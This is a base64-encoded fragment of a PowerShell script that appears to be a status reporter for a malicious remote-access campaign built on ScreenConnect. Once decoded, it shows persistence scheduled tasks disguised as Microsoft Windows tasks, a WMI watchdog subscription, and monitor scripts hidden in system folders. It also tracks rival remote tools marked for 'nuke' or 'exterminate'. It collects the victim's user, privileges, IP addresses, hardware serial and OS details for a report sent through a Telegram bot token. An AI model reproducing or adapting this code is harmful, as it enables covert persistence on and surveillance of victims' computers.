ICAgICAgIH0NCiAgICB9DQoNCiAgICAkdW5pbnN0ID0gQCgNCiAgICAgICAgJ0hLTE06XFNPRlRX
QVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbFwqJywNCiAgICAg
ICAgJ0hLTE06XFNPRlRXQVJFXFdPVzY0MzJOb2RlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRW
ZXJzaW9uXFVuaW5zdGFsbFwqJw0KICAgICkNCiAgICBmb3JlYWNoICgkcGF0aCBpbiAkdW5pbnN0
KSB7DQogICAgICAgIEdldC1JdGVtUHJvcGVydHkgJHBhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5
Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICAkZG4gPSAkXy5EaXNwbGF5
TmFtZQ0KICAgICAgICAgICAgaWYgKC1ub3QgJGRuKSB7IHJldHVybiB9DQogICAgICAgICAgICBp
ZiAoVGVzdC1LZWVwTmFtZSAkZG4pIHsNCiAgICAgICAgICAgICAgICBpZiAoJGRuIC1saWtlICcq
RGF0dG8qJyAtb3IgJGRuIC1saWtlICcqQ2VudHJhU3RhZ2UqJykgeyBBZGQtSGl0ICdrZWVwLWRh
dHRvJyAkZG4gfQ0KICAgICAgICAgICAgICAgIHJldHVybg0KICAgICAgICAgICAgfQ0KICAgICAg
ICAgICAgaWYgKCRkbiAtbGlrZSAnU2NyZWVuQ29ubmVjdConKSB7IHJldHVybiB9DQogICAgICAg
ICAgICBmb3JlYWNoICgkdCBpbiAkdG9rZW5zKSB7DQogICAgICAgICAgICAgICAgaWYgKCRkbiAt
bGlrZSAiKiR0KiIpIHsNCiAgICAgICAgICAgICAgICAgICAgQWRkLUhpdCAnbXNpJyAkZG4NCiAg
ICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9
DQogICAgICAgIH0NCiAgICB9DQoNCiAgICByZXR1cm4gJGhpdHMNCn0NCg0KZnVuY3Rpb24gR2V0
LVNjSW5zdGFsbHMgew0KICAgICRsaXN0ID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMu
R2VuZXJpYy5MaXN0W3N0cmluZ10NCiAgICBHZXQtU2VydmljZSAtRXJyb3JBY3Rpb24gU2lsZW50
bHlDb250aW51ZSB8IFdoZXJlLU9iamVjdCB7ICRfLk5hbWUgLWxpa2UgJ1NjcmVlbkNvbm5lY3Qg
Q2xpZW50KicgfSB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgJGZwID0gaWYgKCRfLk5hbWUg
LW1hdGNoICdcKChbMC05YS1mXXsxNn0pXCknKSB7ICRtYXRjaGVzWzFdIH0gZWxzZSB7ICc/JyB9
DQogICAgICAgICR0YWcgPSBpZiAoJGZwIC1lcSAnNWY2MDEwNTc5ODUyZTUwNycpIHsgJ0tFRVAt
UFJJTUFSWScgfQ0KICAgICAgICBlbHNlaWYgKCRmcCAtZXEgJ2Y4NjFjODE0MGQ0NTM0MjcnKSB7
ICdLRUVQLUFMVCcgfQ0KICAgICAgICBlbHNlIHsgJ0ZPUkVJR04nIH0NCiAgICAgICAgW3ZvaWRd
JGxpc3QuQWRkKCgnLSA8Y29kZT57MH08L2NvZGU+OiA8Yj57MX08L2I+IFt7Mn1dJyAtZiAoRXNj
ICRfLk5hbWUpLCAoRXNjIChbc3RyaW5nXSRfLlN0YXR1cykpLCAkdGFnKSkNCiAgICB9DQoNCiAg
ICAkcm9vdHMgPSBAKA0KICAgICAgICAiJHtlbnY6UHJvZ3JhbUZpbGVzfVxTY3JlZW5Db25uZWN0
IENsaWVudCoiLA0KICAgICAgICAiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFNjcmVlbkNvbm5l
Y3QgQ2xpZW50KiINCiAgICApDQogICAgZm9yZWFjaCAoJHBhdCBpbiAkcm9vdHMpIHsNCiAgICAg
ICAgR2V0LUNoaWxkSXRlbSAtUGF0aCAkcGF0IC1EaXJlY3RvcnkgLUVycm9yQWN0aW9uIFNpbGVu
dGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICBbdm9pZF0kbGlzdC5B
ZGQoKCctIHBhdGg6IDxjb2RlPnswfTwvY29kZT4nIC1mIChFc2MgJF8uRnVsbE5hbWUpKSkNCiAg
ICAgICAgfQ0KICAgIH0NCg0KICAgICR1bmluc3QgPSBAKA0KICAgICAgICAnSEtMTTpcU09GVFdB
UkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsXConLA0KICAgICAg
ICAnSEtMTTpcU09GVFdBUkVcV09XNjQzMk5vZGVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZl
cnNpb25cVW5pbnN0YWxsXConDQogICAgKQ0KICAgIGZvcmVhY2ggKCRwYXRoIGluICR1bmluc3Qp
IHsNCiAgICAgICAgR2V0LUl0ZW1Qcm9wZXJ0eSAkcGF0aCAtRXJyb3JBY3Rpb24gU2lsZW50bHlD
b250aW51ZSB8IFdoZXJlLU9iamVjdCB7DQogICAgICAgICAgICAkXy5EaXNwbGF5TmFtZSAtbGlr
ZSAnKlNjcmVlbkNvbm5lY3QqJw0KICAgICAgICB9IHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAg
ICAgICAgJHZlciA9IGlmICgkXy5EaXNwbGF5VmVyc2lvbikgeyAkXy5EaXNwbGF5VmVyc2lvbiB9
IGVsc2UgeyAnPycgfQ0KICAgICAgICAgICAgW3ZvaWRdJGxpc3QuQWRkKCgnLSBtc2k6IDxjb2Rl
PnswfTwvY29kZT4gdnsxfScgLWYgKEVzYyAkXy5EaXNwbGF5TmFtZSksIChFc2MgJHZlcikpKQ0K
ICAgICAgICB9DQogICAgfQ0KDQogICAgaWYgKCRsaXN0LkNvdW50IC1lcSAwKSB7IFt2b2lkXSRs
aXN0LkFkZCgnLSAobm9uZSknKSB9DQogICAgcmV0dXJuICRsaXN0DQp9DQoNCiRjZmcgPSBHZXQt
Q2ZnDQppZiAoLW5vdCAkY2ZnLkJPVF9UT0tFTiAtb3IgLW5vdCAkY2ZnLkNIQVRfSUQpIHsNCiAg
ICBBZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggKEpvaW4tUGF0aCAkV29ya0RpciAnYm9vdC5lcnIn
KSAtVmFsdWUgJ3RnX3NraXBfbm9fY2ZnJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0K
ICAgIGV4aXQgMg0KfQ0KDQokcHJpbSA9ICdTY3JlZW5Db25uZWN0IENsaWVudCAoNWY2MDEwNTc5
ODUyZTUwNyknDQokYWx0ID0gJ1NjcmVlbkNvbm5lY3QgQ2xpZW50IChmODYxYzgxNDBkNDUzNDI3
KScNCiRvcyA9IEdldC1Pc0luZm8NCiR3aG8gPSBbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJ
ZGVudGl0eV06OkdldEN1cnJlbnQoKS5OYW1lDQokZWxldiA9IChbU2VjdXJpdHkuUHJpbmNpcGFs
LldpbmRvd3NQcmluY2lwYWxdW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzSWRlbnRpdHldOjpH
ZXRDdXJyZW50KCkpLklzSW5Sb2xlKA0KICAgIFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0J1
aWx0SW5Sb2xlXTo6QWRtaW5pc3RyYXRvcikNCiRpc1N5c3RlbSA9ICR3aG8gLWxpa2UgJypTWVNU
RU0qJyAtb3IgJHdobyAtZXEgJ05UIEFVVEhPUklUWVxTWVNURU0nDQoNCiRtc2lDYWNoZSA9IEpv
aW4tUGF0aCAkV29ya0RpciAncGtnLm1zaScNCiRtc2lTaXplID0gaWYgKFRlc3QtUGF0aCAkbXNp
Q2FjaGUpIHsNCiAgICAnezA6TjB9IEtCJyAtZiAoKEdldC1JdGVtICRtc2lDYWNoZSAtRm9yY2Up
Lkxlbmd0aCAvIDFLQikNCn0gZWxzZSB7ICdub25lJyB9DQoNCiRtb25QYXRoID0gSm9pbi1QYXRo
ICRXb3JrRGlyICdvd25fbW9uLmNtZCcNCiRldGxNb24gPSAiJGVudjpQcm9ncmFtRGF0YVxNaWNy
b3NvZnRcRGlhZ25vc2lzXFN0YXRlXC5ldGxjYWNoZVxldGxfbW9uLmNtZCINCiRoYXNNb24gPSBU
ZXN0LVBhdGggJG1vblBhdGgNCiRoYXNFdGwgPSBUZXN0LVBhdGggJGV0bE1vbg0KDQojIFQxMDog
b24tZGlzayBwYXlsb2FkIGJ1aWxkIG1hcmtlcnMgLT4gZXZlcnkgcmVwb3J0IHByb3ZlcyBleGFj
dGx5IHdoYXQgaXMgaW5zdGFsbGVkDQpmdW5jdGlvbiBHZXQtUGF5bG9hZEJ1aWxkKFtzdHJpbmdd
JGZpbGUpIHsNCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRmaWxlKSkgeyByZXR1cm4gJ21pc3Np
bmcnIH0NCiAgICBmb3JlYWNoICgkbCBpbiAoR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRmaWxl
IC1Ub3RhbENvdW50IDggLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKSkgew0K
ICAgICAgICBpZiAoJGwgLW1hdGNoICdCVUlMRFxzK1xkezh9KFtBLVpdK1xkKyknKSB7IHJldHVy
biAkbWF0Y2hlc1sxXSB9DQogICAgfQ0KICAgIHJldHVybiAnPycNCn0NCiRiTW9uID0gR2V0LVBh
eWxvYWRCdWlsZCAoSm9pbi1QYXRoICRXb3JrRGlyICdvd25fbW9uLmNtZCcpDQokYlNlYyA9IEdl
dC1QYXlsb2FkQnVpbGQgKEpvaW4tUGF0aCAkV29ya0RpciAnb3duX3NlY3VyZS5jbWQnKQ0KJGJU
Z3IgPSBHZXQtUGF5bG9hZEJ1aWxkIChKb2luLVBhdGggJFdvcmtEaXIgJ3RnX3JlcG9ydC5wczEn
KQ0KJGJMaWIgPSBHZXQtUGF5bG9hZEJ1aWxkIChKb2luLVBhdGggJFdvcmtEaXIgJ293bl9saWIu
cHMxJykNCg0KIyBwZXItaG9zdCBpZGVudGl0eTogZXhwZWN0ZWQgdGFzayBuYW1lcyBjb21lIGZy
b20gaWRlbnRpdHkuY2ZnIHdoZW4gcHJlc2VudA0KJGlkQ2ZnID0gSm9pbi1QYXRoICRXb3JrRGly
ICdpZGVudGl0eS5jZmcnDQokaWRNYXAgPSBAe30NCmlmIChUZXN0LVBhdGggJGlkQ2ZnKSB7DQog
ICAgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRpZENmZyB8IEZvckVhY2gtT2JqZWN0IHsNCiAg
ICAgICAgaWYgKCRfIC1tYXRjaCAnXlxzKihbQS1aX10rKVxzKj1ccyooLis/KVxzKiQnKSB7ICRp
ZE1hcFskbWF0Y2hlc1sxXV0gPSAkbWF0Y2hlc1syXSB9DQogICAgfQ0KfQ0KJGV4cGVjdGVkVGFz
a3MgPSBAKA0KICAgIEB7IE5hbWUgPSAkKGlmICgkaWRNYXAuVEFTS19BKSB7ICRpZE1hcC5UQVNL
X0EgfSBlbHNlIHsgJ1xNaWNyb3NvZnRcV2luZG93c1xEaWFnbm9zaXNcRXZ0Q2FjaGVTeW5jJyB9
KTsgUm9sZSA9ICJ0aWNrICQoJGlkTWFwLk1PX0EpbSAoY2hhaW4xKSIgfSwNCiAgICBAeyBOYW1l
ID0gJChpZiAoJGlkTWFwLlRBU0tfQikgeyAkaWRNYXAuVEFTS19CIH0gZWxzZSB7ICdcTWljcm9z
b2Z0XFdpbmRvd3NcUExBXFNlcnZlckhlYWx0aCcgfSk7IFJvbGUgPSAiYmFja3VwICQoJGlkTWFw
Lk1PX0IpbSAoY2hhaW4xKSIgfSwNCiAgICBAeyBOYW1lID0gJChpZiAoJGlkTWFwLlRBU0tfQykg
eyAkaWRNYXAuVEFTS19DIH0gZWxzZSB7ICdcTWljcm9zb2Z0XFdpbmRvd3NcV0RJXFJlc29sdXRp
b25Ib3N0UHJveHknIH0pOyBSb2xlID0gJ09OU1RBUlQgKGNoYWluMSknIH0sDQogICAgQHsgTmFt
ZSA9ICQoaWYgKCRpZE1hcC5UQVNLX0QpIHsgJGlkTWFwLlRBU0tfRCB9IGVsc2UgeyAnXE1pY3Jv
c29mdFxXaW5kb3dzXFRjcGlwXElwQ29uZmxpY3RSZXNvbHZlcicgfSk7IFJvbGUgPSAnT05MT0dP
TiAoY2hhaW4xKScgfQ0KKQ0KIyBjaGFpbiAyOiBXTUkgd2F0Y2hkb2cgc3Vic2NyaXB0aW9uDQok
d21pQyA9IEdldC1XbWlPYmplY3QgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3Mg
Q29tbWFuZExpbmVFdmVudENvbnN1bWVyIC1GaWx0ZXIgIk5hbWU9J1d1Y2FjaGVXYXRjaGRvZ0Mn
IiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KJGV4cGVjdGVkVGFza3MgKz0gQHsgTmFt
ZSA9ICdcV01JXFd1Y2FjaGVXYXRjaGRvZ0MnOyBSb2xlID0gJ3RpbWVyIDNtIChjaGFpbjIpJzsg
V21pID0gKCRudWxsIC1uZSAkd21pQykgfQ0KDQokdGFza0xpbmVzID0gTmV3LU9iamVjdCBTeXN0
ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0W3N0cmluZ10NCiR0YXNrT2sgPSAwDQokdGFza0Jh
ZCA9IDANCmZvcmVhY2ggKCR0IGluICRleHBlY3RlZFRhc2tzKSB7DQogICAgaWYgKCR0LkNvbnRh
aW5zS2V5KCdXbWknKSkgew0KICAgICAgICBpZiAoJHQuV21pKSB7ICR0YXNrT2srKzsgJG1hcmsg
PSAnT0snIH0gZWxzZSB7ICR0YXNrQmFkKys7ICRtYXJrID0gJ01JU1NJTkcnIH0NCiAgICAgICAg
W3ZvaWRdJHRhc2tMaW5lcy5BZGQoKCctIFt7MH1dIDxjb2RlPnsxfTwvY29kZT4gLSB7Mn0nIC1m
ICRtYXJrLCAoRXNjICR0Lk5hbWUpLCAoRXNjICR0LlJvbGUpKSkNCiAgICAgICAgY29udGludWUN
CiAgICB9DQogICAgJGggPSBHZXQtVGFza0hlYWx0aCAkdC5OYW1lDQogICAgaWYgKCRoLlByZXNl
bnQgLWFuZCAkaC5IZWFsdGh5KSB7DQogICAgICAgICR0YXNrT2srKw0KICAgICAgICAkbWFyayA9
ICdPSycNCiAgICB9IGVsc2VpZiAoJGguUHJlc2VudCAtYW5kIC1ub3QgJGguT3Vycykgew0KICAg
ICAgICAkdGFza0JhZCsrDQogICAgICAgICRtYXJrID0gJ05PVF9PVVJTJw0KICAgIH0gZWxzZWlm
ICgkaC5QcmVzZW50KSB7DQogICAgICAgICR0YXNrQmFkKysNCiAgICAgICAgJG1hcmsgPSAnV0VB
SycNCiAgICB9IGVsc2Ugew0KICAgICAgICAkdGFza0JhZCsrDQogICAgICAgICRtYXJrID0gJ01J
U1NJTkcnDQogICAgfQ0KICAgICRleHRyYSA9ICcnDQogICAgaWYgKCRoLlByZXNlbnQpIHsNCiAg
ICAgICAgJGJpdHMgPSBAKCkNCiAgICAgICAgaWYgKCRoLlN0YXR1cykgeyAkYml0cyArPSAkaC5T
dGF0dXMgfQ0KICAgICAgICBpZiAoJGguUmVzdWx0IC1uZSAnJyAtYW5kICRoLlJlc3VsdCAtbmUg
JzAnKSB7ICRiaXRzICs9ICgiTGFzdFJlc3VsdD0iICsgJGguUmVzdWx0KSB9DQogICAgICAgIGlm
ICgkYml0cy5Db3VudCkgeyAkZXh0cmEgPSAnICgnICsgKCRiaXRzIC1qb2luICcsICcpICsgJykn
IH0NCiAgICB9DQogICAgW3ZvaWRdJHRhc2tMaW5lcy5BZGQoKCctIFt7MH1dIDxjb2RlPnsxfTwv
Y29kZT4gLSB7Mn17M30nIC1mICRtYXJrLCAoRXNjICR0Lk5hbWUpLCAoRXNjICR0LlJvbGUpLCAo
RXNjICRleHRyYSkpKQ0KfQ0KDQokcHJpbUxpbmUgPSBHZXQtU3ZjTGluZSAkcHJpbQ0KJGFsdExp
bmUgPSBHZXQtU3ZjTGluZSAkYWx0DQokcHJpbU9rID0gJHByaW1MaW5lIC1saWtlICdSdW5uaW5n
KicNCiRkZXBsb3lPayA9ICRwcmltT2sgLWFuZCAoJHRhc2tPayAtZ2UgMykgLWFuZCAkaGFzTW9u
DQoNCiRlbW9qaU1hcCA9IEB7DQogICAgT0sgICAgICAgPSBbc3RyaW5nXShbY2hhcl0weDI3MDUp
DQogICAgRE9XTiAgICAgPSAoW3N0cmluZ11bY2hhcl06OkNvbnZlcnRGcm9tVXRmMzIoMHgxRjZB
OCkpDQogICAgUkVTVE9SRUQgPSAoW3N0cmluZ11bY2hhcl06OkNvbnZlcnRGcm9tVXRmMzIoMHgx
RjdFMikpDQogICAgRkFJTCAgICAgPSBbc3RyaW5nXShbY2hhcl0weDI3NEMpDQogICAgRk9SQ0Ug
ICAgPSBbc3RyaW5nXShbY2hhcl0weDI2QTEpDQogICAgREVQTE9ZICAgPSAoW3N0cmluZ11bY2hh
cl06OkNvbnZlcnRGcm9tVXRmMzIoMHgxRjY4MCkpDQogICAgSEIgICAgICAgPSAoW3N0cmluZ11b
Y2hhcl06OkNvbnZlcnRGcm9tVXRmMzIoMHgxRjRFMSkpDQp9DQoka2V5ID0gJFN0YXRlLlRvVXBw
ZXJJbnZhcmlhbnQoKQ0KJGVtb2ppID0gaWYgKCRlbW9qaU1hcC5Db250YWluc0tleSgka2V5KSkg
eyAkZW1vamlNYXBbJGtleV0gfSBlbHNlIHsgKFtzdHJpbmddW2NoYXJdOjpDb252ZXJ0RnJvbVV0
ZjMyKDB4MUY0RjEpKSB9DQoNCiR0aXRsZSA9IHN3aXRjaCAoJGtleSkgew0KICAgICdPSycgeyAn
UHJpbWFyeSBoZWFsdGh5JyB9DQogICAgJ0RPV04nIHsgJ1ByaW1hcnkgRE9XTiAtIGhlYWxpbmcn
IH0NCiAgICAnUkVTVE9SRUQnIHsgJ1ByaW1hcnkgUkVTVE9SRUQnIH0NCiAgICAnRkFJTCcgeyAn
SGVhbCBGQUlMRUQnIH0NCiAgICAnRk9SQ0UnIHsgJ0ZvcmNlZCByZWluc3RhbGwnIH0NCiAgICAn
REVQTE9ZJyB7IGlmICgkZGVwbG95T2spIHsgJ0ZJUlNUIERFUExPWSBPSycgfSBlbHNlIHsgJ0ZJ
UlNUIERFUExPWSAtIENIRUNLIE5FRURFRCcgfSB9DQogICAgJ0hCJyB7ICdob3VybHkgZGlnZXN0
JyB9DQogICAgZGVmYXVsdCB7ICJTdGF0ZTogJFN0YXRlIiB9DQp9DQoNCiR0cmFucyA9IGlmICgk
T2xkU3RhdGUpIHsgIiRPbGRTdGF0ZSAtPiAkU3RhdGUiIH0gZWxzZSB7ICRTdGF0ZSB9DQokc2NM
aXN0ID0gR2V0LVNjSW5zdGFsbHMNCiRybW1IaXRzID0gR2V0LVJtbUhpdHMNCmlmICgkcm1tSGl0
cy5Db3VudCAtZXEgMCkgeyBbdm9pZF0kcm1tSGl0cy5BZGQoJy0gKG5vbmUgZGV0ZWN0ZWQpJykg
fQ0KDQokcHViID0gR2V0LVB1YmxpY0lwDQokbGFuID0gR2V0LUxvY2FsSXBzDQokbm93ID0gR2V0
LURhdGUgLUZvcm1hdCAneXl5eS1NTS1kZCBISDptbTpzcyB6enonDQokdXB0aW1lID0gJ24vYScN
CnRyeSB7DQogICAgJGJvb3QgPSAoR2V0LUNpbUluc3RhbmNlIFdpbjMyX09wZXJhdGluZ1N5c3Rl
bSkuTGFzdEJvb3RVcFRpbWUNCiAgICAkdXB0aW1lID0gJ3swOmRkfWQgezA6aGh9aCB7MDptbX1t
JyAtZiAoKEdldC1EYXRlKSAtICRib290KQ0KfSBjYXRjaCB7fQ0KDQojIGNhbXBhaWduIHN0YXRl
IGZpbGUgKHdyaXR0ZW4gYnkgb3duX2xpYi5wczEgc3RhdGUgYWN0aW9uKQ0KJHN0YXRlTGluZSA9
ICduL2EnDQokc3RhdGVPYmogPSAkbnVsbA0KJHN0YXRlUGF0aDIgPSBKb2luLVBhdGggJFdvcmtE
aXIgJ3N0YXRlLmpzb24nDQppZiAoVGVzdC1QYXRoICRzdGF0ZVBhdGgyKSB7DQogICAgJHJhd1N0
YXRlID0gKEdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkc3RhdGVQYXRoMiAtUmF3KS5UcmltKCkN
CiAgICB0cnkgew0KICAgICAgICAkc3RhdGVPYmogPSAkcmF3U3RhdGUgfCBDb252ZXJ0RnJvbS1K
c29uDQogICAgICAgICRmb3JlaWduQ3N2ID0gaWYgKCRzdGF0ZU9iai5mb3JlaWduKSB7ICgkc3Rh
dGVPYmouZm9yZWlnbiAtam9pbiAnLCcpIH0gZWxzZSB7ICctJyB9DQogICAgICAgICRzdGF0ZUxp
bmUgPSAicHJpbT0kKCRzdGF0ZU9iai5wcmltKSBhbHQ9JCgkc3RhdGVPYmouYWx0KSBmb3JlaWdu
PVskZm9yZWlnbkNzdl0gdGFza3M9JCgkc3RhdGVPYmoudGFza3NPaykvJCgkc3RhdGVPYmoudGFz
a3NUb3RhbCkgd2Q9JCgkc3RhdGVPYmoud2F0Y2hkb2cpIGhlYWxzPSQoJHN0YXRlT2JqLmluc3Rh
bGxDb3VudCkiDQogICAgfSBjYXRjaCB7ICRzdGF0ZUxpbmUgPSAkcmF3U3RhdGUgfQ0KfQ0KDQok
ZGVwbG95QmxvY2sgPSAnJw0KaWYgKCRrZXkgLWVxICdERVBMT1knKSB7DQogICAgJHZlcmRpY3Qg
PSBpZiAoJGRlcGxveU9rKSB7ICdERVBMT1lFRCAvIEhFQUxUSFknIH0gZWxzZSB7ICdERVBMT1lF
RCBCVVQgSU5DT01QTEVURScgfQ0KICAgICRmb3JlaWduID0gQChHZXQtQ2hpbGRJdGVtIC1QYXRo
ICIke2VudjpQcm9ncmFtRmlsZXN9XFNjcmVlbkNvbm5lY3QgQ2xpZW50KiIsIiR7ZW52OlByb2dy
YW1GaWxlcyh4ODYpfVxTY3JlZW5Db25uZWN0IENsaWVudCoiIC1EaXJlY3RvcnkgLUVycm9yQWN0
aW9uIFNpbGVudGx5Q29udGludWUgfA0KICAgICAgICBXaGVyZS1PYmplY3QgeyAkXy5OYW1lIC1u
b3RtYXRjaCAnNWY2MDEwNTc5ODUyZTUwN3xmODYxYzgxNDBkNDUzNDI3JyB9KQ0KICAgICRkaWFn
TGluZXMgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3Rbc3RyaW5n
XQ0KICAgICRib290UGF0aCA9IEpvaW4tUGF0aCAkV29ya0RpciAnYm9vdC5lcnInDQogICAgaWYg
KFRlc3QtUGF0aCAkYm9vdFBhdGgpIHsNCiAgICAgICAgJGludGVyZXN0aW5nID0gQCgNCiAgICAg
ICAgICAgICdtc2lfJywgJ2ZldGNoXycsICdwcmltYXJ5XycsICdudWtlXycsICdtc2lfdG9vJywg
J21zaV9mZXRjaCcsICdtc2lfZXhpdCcsDQogICAgICAgICAgICAnbXNpX3VuYXZhaWxhYmxlJywg
J3NlY3VyZV8nLCAnZ29fJywgJ2V4dGVybWluYXRlXycsICdpZGVudGl0eV8nLA0KICAgICAgICAg
ICAgJ2NyZWF0ZV90YXNrJywgJ3ZlcmlmeV90YXNrJywgJ29ycGhhbl8nLCAnc3RhbGVfJywgJ3Bv
c3RpbnN0YWxsJywgJ2FsdF8nDQogICAgICAgICkNCiAgICAgICAgR2V0LUNvbnRlbnQgLUxpdGVy
YWxQYXRoICRib290UGF0aCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8DQogICAgICAg
ICAgICBXaGVyZS1PYmplY3Qgew0KICAgICAgICAgICAgICAgICRsaW5lID0gJF8NCiAgICAgICAg
ICAgICAgICBmb3JlYWNoICgkdCBpbiAkaW50ZXJlc3RpbmcpIHsgaWYgKCRsaW5lIC1saWtlICIq
JHQqIikgeyByZXR1cm4gJHRydWUgfSB9DQogICAgICAgICAgICAgICAgJGZhbHNlDQogICAgICAg
ICAgICB9IHwNCiAgICAgICAgICAgIFNlbGVjdC1PYmplY3QgLUxhc3QgMjYgfA0KICAgICAgICAg
ICAgRm9yRWFjaC1PYmplY3QgeyBbdm9pZF0kZGlhZ0xpbmVzLkFkZCgoJy0gPGNvZGU+ezB9PC9j
b2RlPicgLWYgKEVzYyAoJF8gLXJlcGxhY2UgJ1teXHgyMC1ceDdFXScsICc/JykpKSkgfQ0KICAg
IH0NCiAgICBpZiAoJGRpYWdMaW5lcy5Db3VudCAtZXEgMCkgeyBbdm9pZF0kZGlhZ0xpbmVzLkFk
ZCgnLSAobm8gaW5zdGFsbC9udWtlIG1hcmtlcnMgaW4gYm9vdC5lcnIpJykgfQ0KICAgICRkZXBs
b3lCbG9jayA9IEAiDQoNCjxiPkRlcGxveSB2ZXJkaWN0PC9iPg0KLSBSZXN1bHQ6IDxiPiQoRXNj
ICR2ZXJkaWN0KTwvYj4NCi0gUHJpbWFyeSBSdW5uaW5nOiAkKGlmICgkcHJpbU9rKSB7ICdZRVMn
IH0gZWxzZSB7ICdOTycgfSkNCi0gTW9uaXRvciBzY3JpcHQgKC53dWNhY2hlXG93bl9tb24uY21k
KTogJChpZiAoJGhhc01vbikgeyAnWUVTJyB9IGVsc2UgeyAnTk8nIH0pDQotIEJhY2t1cCBtb24g
KC5ldGxjYWNoZVxldGxfbW9uLmNtZCk6ICQoaWYgKCRoYXNFdGwpIHsgJ1lFUycgfSBlbHNlIHsg
J05PJyB9KQ0KLSBQZXJzaXN0IHRhc2tzIE9LOiAkdGFza09rIC8gJCgkZXhwZWN0ZWRUYXNrcy5D
b3VudCkgKGJhZC9taXNzaW5nOiAkdGFza0JhZCkNCi0gTVNJIGNhY2hlOiAkKEVzYyAkbXNpU2l6
ZSkNCi0gRm9yZWlnbiBTQyBmb2xkZXJzIGxlZnQ6ICQoJGZvcmVpZ24uQ291bnQpDQotIE5vdGU6
IExhc3RSZXN1bHQgMjY3MDExID0gdGFzayBub3QgeWV0IHJ1biAobm9ybWFsIHJpZ2h0IGFmdGVy
IGNyZWF0ZSkNCg0KPGI+RGVwbG95IGxvZyBtYXJrZXJzPC9iPg0KJCgkZGlhZ0xpbmVzIC1qb2lu
ICJgbiIpDQoiQA0KfQ0KDQokdGV4dCA9IEAiDQokZW1vamkgPGI+U0MgTW9uaXRvciAtICQoRXNj
ICR0aXRsZSk8L2I+DQoNCjxiPkV2ZW50PC9iPg0KLSBTdW1tYXJ5OiAkKEVzYyAkU3VtbWFyeSkN
Ci0gVHJhbnNpdGlvbjogPGNvZGU+JChFc2MgJHRyYW5zKTwvY29kZT4NCi0gV2hlbjogJChFc2Mg
JG5vdykNCi0gU291cmNlIGJ1aWxkOiA8Y29kZT4kKEVzYyAkQnVpbGQpPC9jb2RlPg0KJGRlcGxv
eUJsb2NrDQoNCjxiPkhvc3Q8L2I+DQotIENvbXB1dGVyOiA8Y29kZT4kKEVzYyAkZW52OkNPTVBV
VEVSTkFNRSk8L2NvZGU+DQotIFVzZXI6IDxjb2RlPiQoRXNjICR3aG8pPC9jb2RlPg0KLSBFbGV2
YXRlZDogJGVsZXYgfCBTWVNURU06ICRpc1N5c3RlbQ0KLSBEb21haW4vV29ya2dyb3VwOiAkKEVz
YyAkb3MuRG9tYWluKQ0KDQo8Yj5OZXR3b3JrPC9iPg0KLSBMQU4gSVBzOiA8Y29kZT4kKEVzYyAk
bGFuKTwvY29kZT4NCi0gUHVibGljIElQOiA8Y29kZT4kKEVzYyAkcHViKTwvY29kZT4NCg0KPGI+
T1MgLyBIYXJkd2FyZTwvYj4NCi0gT1M6ICQoRXNjICRvcy5DYXB0aW9uKQ0KLSBWZXJzaW9uOiAk
KEVzYyAkb3MuVmVyc2lvbikgKGJ1aWxkICQoRXNjICRvcy5CdWlsZCkpICQoRXNjICRvcy5BcmNo
KQ0KLSBJbnN0YWxsOiAkKEVzYyAkb3MuSW5zdGFsbERhdGUpIHwgTGFzdCBib290OiAkKEVzYyAk
b3MuTGFzdEJvb3QpDQotIFVwdGltZTogJChFc2MgJHVwdGltZSkNCi0gQ1BVOiAkKEVzYyAkb3Mu
Q1BVKQ0KLSBIYXJkd2FyZTogJChFc2MgJG9zLk1hbnVmYWN0dXJlcikgJChFc2MgJG9zLk1vZGVs
KQ0KLSBTZXJpYWw6IDxjb2RlPiQoRXNjICRvcy5TZXJpYWwpPC9jb2RlPg0KLSBSQU06ICQoJG9z
LlRvdGFsUkFNX0dCKSBHQg0KLSBEaXNrIEM6ICQoJG9zLkRpc2tGcmVlX0dCKSBHQiBmcmVlIC8g
JCgkb3MuRGlza1NpemVfR0IpIEdCDQoNCjxiPlNjcmVlbkNvbm5lY3QgKGFsbCk8L2I+DQotIFBy
aW1hcnkgPGNvZGU+NWY2MDEwNTc5ODUyZTUwNzwvY29kZT46ICQoRXNjICRwcmltTGluZSkNCi0g
QWx0IDxjb2RlPmY4NjFjODE0MGQ0NTM0Mjc8L2NvZGU+OiAkKEVzYyAkYWx0TGluZSkNCiQoJHNj
TGlzdCAtam9pbiAiYG4iKQ0KDQo8Yj5PdGhlciBSTU0gLyByZW1vdGUgdG9vbHM8L2I+DQokKCRy
bW1IaXRzIC1qb2luICJgbiIpDQoNCjxiPlBlcnNpc3QgdGFza3MgKGV4cGVjdGVkKTwvYj4NCiQo
